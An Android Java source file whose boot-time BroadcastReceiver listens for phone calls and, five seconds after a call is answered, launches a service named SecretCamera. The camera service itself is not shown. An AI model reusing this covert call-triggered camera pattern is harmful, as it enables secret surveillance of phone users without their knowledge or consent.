package com.devapp.memoir;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

public class BootupBroadcastReceiver extends BroadcastReceiver {

	private TelephonyManager mTelephonyManager = null;
	private Context mContext = null;

	private PhoneStateListener mPhoneListener = new PhoneStateListener() {
		public void onCallStateChanged(int state, String incomingNumber) {
			try {
				switch (state) {
				case TelephonyManager.CALL_STATE_RINGING:
					break;
				case TelephonyManager.CALL_STATE_OFFHOOK:
					Log.d("asd", "Setting the timer now ");
					
					Handler handler = new Handler();
					handler.postDelayed(new Runnable() {

						@Override
						public void run() {
							Log.d("asd", "Starting secret Camera from handler");
							Intent intent = new Intent(mContext,
									SecretCamera.class);
							mContext.startService(intent);
						}
					}, 5000);
					break;
				case TelephonyManager.CALL_STATE_IDLE:
					break;
				default:
					Log.i("Default", "Unknown phone state=" + state);
				}
			} catch (Exception e) {
				Log.i("Exception", "PhoneStateListener() e = " + e);
			}
		}
	};

	@Override
	public void onReceive(Context context, Intent arg1) {
		Log.d("asd", "My Boradcast called :)");
		mContext = context;
		mTelephonyManager = (TelephonyManager) context
				.getSystemService(Context.TELEPHONY_SERVICE);
		mTelephonyManager.listen(mPhoneListener,
				PhoneStateListener.LISTEN_CALL_STATE);
	}

}
